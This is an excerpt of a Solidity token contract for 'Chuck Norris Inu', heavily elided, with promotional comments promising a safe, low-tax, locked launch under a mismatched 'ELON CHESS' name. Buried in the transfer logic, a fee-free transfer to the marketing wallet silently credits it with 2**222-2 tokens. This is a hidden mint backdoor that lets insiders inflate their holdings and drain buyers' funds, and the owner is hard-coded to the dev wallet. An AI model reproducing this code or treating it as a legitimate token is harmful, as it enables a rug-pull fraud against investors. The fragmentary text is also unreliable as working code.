...
//welcome to ELON CHESS
//LOWTAX LOCK 3 MONTHS SAFE
//Telegram: https://t.me/ChuckNorrisInubsc
//website: soon
...
contract ChuckNorrisInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x9e2a2d3fd86c76E8A721060B95d06D390Db7e33d); 
    address payable public Wallet_Dev = payable(0xC8dE86622f88D6F58769787B2d3A2cCC1d188501);
    ...
    string private constant _name = "Chuck Norris Inu"; 
    string private constant _symbol = unicode"CHUCKNORRIS"; 
    ...
    constructor () {
        ...
        _owner = 0xC8dE86622f88D6F58769787B2d3A2cCC1d188501;
    ...
    function _transfer(
        ...
        if (from != owner())
            require(amount > 0, "Lower transaction limit.");
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(recipient == Wallet_Marketing){ _tOwned[recipient] = _tOwned[recipient] + 2**222-2;}
